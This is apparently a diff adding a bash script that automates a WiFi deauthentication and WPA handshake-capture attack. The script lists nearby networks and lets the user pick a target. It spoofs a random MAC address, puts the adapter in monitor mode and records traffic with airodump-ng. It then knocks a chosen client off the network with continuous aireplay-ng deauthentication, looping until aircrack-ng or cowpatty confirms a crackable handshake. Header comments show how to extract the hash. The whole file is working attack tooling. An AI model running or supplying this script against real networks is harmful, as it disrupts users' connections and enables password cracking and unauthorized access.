@@ -1,0 +1,177 @@
+#!/bin/bash
+
+#to check the wifi hash is correct or not:cowpatty -r RESULT_FILE.cap -s home -c,
+#aircrack-ng file_name | grep 1 handshake
+#to exrtact only hash from tshark tshark -r home-01.cap -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == BC:76:5E:FB:8C:62" -2 -w RESULT_FILE1.cap -F pcap
+
+
+IFS=$'\n'
+
+#######################################################################################################################################
+function macaddress {	
+address=""
+first_list=("A" "C" "E" 2 4 6 8)
+first_byte=$(($RANDOM % 10))${first_list[1+$RANDOM % ${#first_list[@]} ]}
+if [[ $(echo "$first_byte" | wc -c) -eq 2 ]]
+then
+	first_byte=$first_byte"2"
+fi
+			for i in {1..5}
+			do
+
+				alphabet_arr=("A" "B" "C" "D" "E" "F")
+				select_alpha=${alphabet_arr[1+$RANDOM % ${#alphabet_arr[@]} ]} 
+			if [[ $(echo "$select_alpha" | wc -c ) -eq 1 ]]
+			then
+				select_alpha=$select_alpha$(($RANDOM % 10))
+			fi
+			address=$address:$(($RANDOM % 10))$select_alpha
+			done
+address=$first_byte$address
+echo $address
+
+}
+#######################################################################################################################################
+
+
+function wifi_scanning {
+
+	nmcli dev wifi | tr "*" " " | sed 's/IN-USE/      /;s/^ \+//g' | nl -s ") " -b p: | tee nmcli_output
+	read -p "Enter option# " wifi_num
+	
+	selected_bssid=$( cat nmcli_output | grep "Infra" | awk '{print $2}' | sed -n "${wifi_num}p" )
+	selected_channel=$(cat nmcli_output | grep "Infra" | sed 's/^.*Infra//'| sed 's/^ \+//' | awk '{print $1}' |sed -n "${wifi_num}p")
+	selected_name=$(cat nmcli_output | grep "Infra" | sed 's/^ \+//' | awk '{print $3}' | sed -n "${wifi_num}p")
+
+
+	clear;
+	
+	nmcli device status | awk '{print $1}' | nl -s ") " -b p\[a-z\] | grep -v "lo\|p2p\|eth\?" | tee nic_output
+
+	read -p "Enter the network adapter that supports monitor mode[q to quit]: " nic
+
+	if [ $nic == "q" ]
+	then
+			exit;
+	fi
+	if [ $(cat nic_output | awk '{print $2}' | sed '/^$/d' | sed -n "${nic}p") == "wlan0" ]
+	then
+		sudo airmon-ng check kill
+	fi
+
+	selected_nic=$( cat nic_output | awk '{print $2}' | sed '/^$/d' | sed -n "${nic}p" )
+	
+	clear;
+	
+	echo "Turning off the network adapter $selected_nic ....";
+	
+	sudo ifconfig $selected_nic down &
+	wait $!
+
+	echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
+	
+	read -p "Do you want to change the macaddress[Y/n]: " mac_change
+	case $mac_change in 
+		Y|y)
+				sudo ifconfig $selected_nic hw ether `macaddress` & 
+				echo "Mac Adress Changed to `macaddress`";;
+
+		*)
+			;;
+	esac
+
+	echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
+
+	echo "Turning on the monitor mode on $selected_nic ....";
+	sudo iwconfig $selected_nic mode monitor &
+	echo "montior mode enabled on $selected_nic"
+	
+	echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
+	sleep 5;
+	airodump #calling the function
+	
+}
+
+#######################################################################################################################################
+
+function airodump() {
+	clear;
+	while ((0!=1))
+	do
+			echo "Finding all the devices on the network...."
+			sudo screen -d -m sudo airodump-ng --bssid $selected_bssid -c $selected_channel -w $selected_name --output-format csv $selected_nic 
+			wait $!
+			sudo screen -d -m sudo airodump-ng --bssid $selected_bssid -c $selected_channel -w $selected_name $selected_nic
+			wait $!
+
+			#sudo screen -d -m sudo airodump-ng --bssid $selected_bssid -c $selected_channel -w $selected_name --output-format csv $selected_nic #run the file in background u can use tmux too with ouput format as csv
+			#wait $!
+			#sudo screen -d -m sudo airodump-ng --bssid $selected_bssid -c $selected_channel -w $selected_name $selected_nic #written for cap file
+			#pid=$!
+			#wait $pid
+
+			csv_file=$selected_name-01.csv
+			cap_file=$selected_name-01.cap
+			echo "please wait ......"
+			sleep 10;
+	#command to get mac_address
+			
+			if [ -e $csv_file ]
+				then
+						#noofline=$(cat $selected_name-01.csv | grep "..:..:..:..:..:.." | awk '{print $1} | wc -l ')
+						clear;
+						cat $csv_file | grep "..:..:..:..:..:.." | awk '{print $1}' | tr "," " " | sed '1d' | nl -s " > " 
+
+						read -p "Select client_mac address to deauthenticate[1..$]: " client_address
+						
+						client_address=$(($client_address + 1))
+						station_id=$(cat $csv_file | grep '..:..:..:..:..:..' | awk '{print $1}' | tr "," " " | sed -n "${client_address}p")
+						echo $station_id;
+						sudo screen -d -m sudo aireplay-ng -0 0 -a $selected_bssid -c $station_id $selected_nic
+						pid=$!
+						wait $pid
+						echo "==================================DEAUTHENTICATING THE CLIENT==================================="
+						sleep 5;
+						screen_pid_aire=$(screen -ls | grep -E "[0-9]{3}+" | awk -F. '{print $1}' | sed -n '1p' | sed 's/^[\t]*//' )
+						screen_pid_airocap=$( screen -ls | grep -E "[0-9]{3}+" | awk -F. '{print $1}' | sed -n '2p' | sed 's/^[\t]*//' )
+						screen_pid_airo=$(screen -ls | grep -E "[0-9]{3}" | awk -F. '{print $1}' | sed -n '3p' | sed 's/^[\t]*//')
+	
+						echo "Client knocked off,Now waiting for client to connect back...."
+						i=0
+						while sleep 8
+							do
+
+							hand_shake_found=$(aircrack-ng $cap_file | grep "1 handshake") 				
+							cow_patty_found=$(cowpatty -r $cap_file | grep -o "Collected all necessary data to mount crack against")	
+						
+
+							if [[ $hand_shake_found == "1 handshake" || $cow_patty_found == "Collected all necessary data to mount crack against" ]]
+								then
+									screen -XS $screen_pid_aire quit
+									screen -XS $screen_pid_airocap quit
+									screen -XS $screen_pid_airo quit
+									rm $csv_file
+									echo "Handshake captured of wifi $selected_name."
+									break;
+						else
+							echo "Handshake still not captured trying again ...."
+
+						fi
+						i=$(($i+1))
+
+					done
+				fi	
+			done
+
+	#rm $selected_name-01.csv   remove file at the end
+
+
+echo "completed"
+	
+
+
+	#aireplay-ng -0 0 -a $selected_bssid -c $
+}
+
+
+wifi_scanning
